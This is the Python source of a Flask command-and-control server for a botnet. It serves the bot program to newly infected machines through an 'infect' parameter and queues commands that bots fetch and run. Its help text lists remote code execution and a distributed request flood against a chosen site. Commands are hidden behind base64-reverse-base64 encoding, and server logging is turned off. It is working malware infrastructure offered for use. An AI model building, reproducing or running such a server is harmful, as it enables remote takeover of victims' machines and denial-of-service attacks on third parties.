# imports
import subprocess, flask
from flask import request, jsonify
from os import system, name
import logging, base64, time, string, random

#  define server settings and setting admin password
host = "0.0.0.0"
port = 80
global adminpass
adminpass = str("".join(
  random.choices(string.ascii_lowercase + string.digits, k=7)))


# clear the console supporting cross platform
def clear():
  if name == "nt":
    _ = system("cls")
  else:
    _ = system("clear")


# fancy date
def datetime():
  part1 = str(time.localtime()).replace("time.struct_time(", "")
  part2 = part1.replace(")", "")
  part3 = part2.replace(",", "")
  part4 = part3.replace(" ", ":")
  (
    raw_year,
    raw_month,
    raw_day,
    raw_hour,
    raw_minute,
    raw_seconds,
    empty1,
    empty2,
    empty3,
  ) = part4.split(":")
  year = raw_year.replace("tm_year=", "")
  month = raw_month.replace("tm_mon=", "")
  day = raw_day.replace("tm_mday=", "")
  hour = raw_hour.replace("tm_hour=", "")
  minute = raw_minute.replace("tm_min=", "")
  seconds = raw_seconds.replace("tm_sec=", "")
  return f"[{month}/{day}/{year}][{hour}:{minute}:{seconds}]"


# encode input with base64
def b64_encode(input):
  input_ascii = input.encode("ascii")
  input_b64_raw = base64.b64encode(input_ascii)
  input_b64 = input_b64_raw.decode("ascii")
  return input_b64


# decode base64 input
def b64_decode(string):
  string_ascii = string.encode("ascii")
  string_decoded_raw = base64.b64decode(string_ascii)
  string_decoded = string_decoded_raw.decode("ascii")
  return string_decoded


# reverse input
def reverse(input):
  return input[::-1]

  
# full encode
def encode(string):
  step1 = b64_encode(string)
  step2 = reverse(step1)
  output = b64_encode(step2)
  return output


# full decode
def decode(string):
  step4 = b64_decode(string)
  step5 = reverse(step4)
  output = b64_decode(step5)
  return output


# clear the command file
def clearcommand():
  with open("txt/command.txt", "r+") as file:
    file.truncate(0)


# get the contents of the command file
def getcommand():
  with open("txt/command.txt", "r+") as commandfile:
    command = commandfile.read()
    return command


# set the content of the command file
def setcommand(command):
  with open("txt/command.txt", "r+") as commandfile:
    commandfile.truncate(0)
    commandfile.writelines(encode(command))
    commandfile.close()
    return command


# toggle the bots
def bottoggle():
  global x
  x = not x
  if x == True:
    with open("txt/bottoggle.txt", "r+") as bottogglefile:
      bottogglefile.truncate(0)
      bottogglefile.writelines(encode(str("listen")))
      bottogglefile.close()
      print("cnc > bots set to Listen")
      return "listen"
  else:
    with open("txt/bottoggle.txt", "r+") as bottogglefile:
      bottogglefile.truncate(0)
      bottogglefile.writelines(encode(str("off")))
      bottogglefile.close()
      print("cnc > bots set to Off")
      return "off"


# define the app and some basic values
app = flask.Flask(__name__)
x = True
bots = 0


# the main page
@app.route("/", methods=["GET"])
def api_home():
  with open("html/index.html", "r") as f:
    html = f.read()
  return html


# the login page
@app.route("/login", methods=["GET"])
def api_login():
  with open("html/login.html", "r") as f:
    html = f.read()
  return html


# where the bot checks if its toggled or not
@app.route("/check", methods=["GET"])
def api_check():
  with open("txt/bottoggle.txt", "r+") as bottogglefile:
    istoggled = bottogglefile.read()
    return istoggled


# where the bot gets controlled
@app.route("/bot", methods=["GET"])
def api_bot():
  if "check" in request.args:
    with open("txt/bottoggle.txt", "r+") as bottogglefile:
      istoggled = bottogglefile.read()
      return istoggled
  elif "toggle" in request.args:
    return bottoggle()
  elif "connect" in request.args:
    print(f"cnc > bot connected! > {request.args['connect']}")
    return "connected"
  elif "infect" in request.args:
    with open("bot.py") as f:
      contents = f.read()
      return contents
  else:
    command = getcommand()
    return command


# the main cnc access
@app.route("/cnc", methods=["GET"])
def api_cnc():
  if "command" in request.args:
    command = request.args["command"]
    setcommand(command)
    print(f"cnc > set command > {command} > {encode(command)}")
    return f"set command : {command} > {encode(command)}\n"
  elif "help" in request.args:
    return """
  ├── Spaces = %%
  ├── Remote Code Executon
  │   └── /cnc?command=*rce*uname%%-a\n
  ├── Distributed Request flood
  │   └── /cnc?command=*req*https://google.com::100::10
  ├── Print Message
  │   └── /cnc?command=*print*Hello%%World\n"""
  else:
    with open("html/404.html", "r") as f:
      errorpage = f.read()
    return errorpage


# the admin/auth


@app.route("/admin", methods=["GET"])
def admin():
  if "passwordcheck" in request.args:
    global adminpass
    if request.args["passwordcheck"] == adminpass:
      print("cnc > Admin authenticated")
      return "good"
    else:
      print("cnc > Admin authentication failed")
      return "bad"
  else:
    with open("html/404.html", "r") as f:
      errorpage = f.read()
    return errorpage


# the main panel
@app.route("/panel", methods=["GET"])
def panel():
  if "password" in request.args:
    global adminpass
    if request.args["password"] == adminpass:
      with open("html/panel.html", "r") as f:
        panel_page = f.read()
      print("cnc > Admin Logged into panel")
      adminpass = str("".join(
        random.choices(string.ascii_lowercase + string.digits, k=7)))
      clear()
      print(banner())
      print(f"cnc > Admin password changed > {adminpass}")
      return panel_page
    else:
      with open("html/404.html", "r") as f:
        errorpage = f.read()
      return errorpage
  else:
    with open("html/404.html", "r") as f:
      errorpage = f.read()
    return errorpage


# goofy ahh temp way to call the style.css
@app.route("/style.css", methods=["GET"])
def style():
  with open("html/style.css", "r") as f:
    css = f.read()
  return css


# server log banner
def banner():
  return f"""
  Flask Cnc Server
  ├── Started at {datetime()}
  ├── Admin Password : {adminpass}
  ├── Host           : {host}
  └── Port           : {port}
"""


# disable the flask logs
log = logging.getLogger("werkzeug")
log.disabled = True
# clear the console
clear()
# print the banner
print(banner())
# start the server
app.run(host=host, port=port, debug=True)
